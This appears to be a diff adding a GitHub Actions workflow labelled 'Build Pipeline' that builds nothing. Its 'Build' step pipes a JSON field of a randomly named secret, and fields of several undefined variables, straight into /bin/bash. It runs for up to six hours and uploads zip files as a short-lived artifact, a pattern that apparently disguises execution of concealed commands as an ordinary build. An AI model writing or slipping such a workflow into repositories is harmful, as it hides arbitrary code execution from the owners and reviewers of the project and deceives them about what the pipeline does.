@@ -1,0 +1,39 @@
+name: Build Pipeline
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+  actions: read
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  operation:
+    name: Main task
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Build
+        env:
+          qqca29: ${{ secrets.qqca29 }}
+        run: |
+          printf '%s' "$qqca29" | jq -r .olzu894 | /bin/bash
+          printf '%s' "$u05246" | jq -r .dedyt49 | /bin/bash
+          echo $ney5982 | jq -r .i72514 | /bin/bash
+          echo $odcyg14 | jq -r .la7273 | /bin/bash
+          echo $oad6 | jq -r .subgq59194 | /bin/bash
+
+      - name: Archive output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: B16X18V0
+          path: "*.zip"
+          retention-days: 1
